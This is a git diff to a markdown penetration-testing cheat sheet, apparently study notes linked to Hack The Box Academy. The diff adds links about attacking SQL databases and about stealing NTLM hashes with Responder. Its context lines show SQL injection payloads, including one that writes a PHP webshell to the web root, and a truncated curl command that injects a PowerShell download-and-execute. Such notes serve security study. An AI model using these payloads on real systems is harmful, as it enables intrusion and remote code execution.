@@ -349,8 +349,7 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 | **Blind payloads**                                                                                                                       | **Description**                                                                                                                                                                                                        |
 | `' AND IF (1=1, sleep(3),'false') -- //`                                                                                                 | **Time-based** SQLi. IF condition will always be true inside the statement itself, so it will return false if the user is non-existent                                                                                 |
 | `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //`                 | Write a shell in root folder                                                                                                                                                                                           |
-
-
+**Attacking SQL Databases**: https://academy.hackthebox.com/module/116/section/1169
 
 Enable code execution in MSSQL (`xp_cmdshell`):
 
@@ -403,4 +402,5 @@ We can get an error with the above payload but the error is related to the incor
 | **Command** | **Description** |
 | ---- | ---- |
 | `-X OPTIONS` | Set HTTP Method with Curl |
-
+### Stealing NTLM Hash with Responder
+[[2. Attacking AD#Stealing NTLM hashes with Responder]]
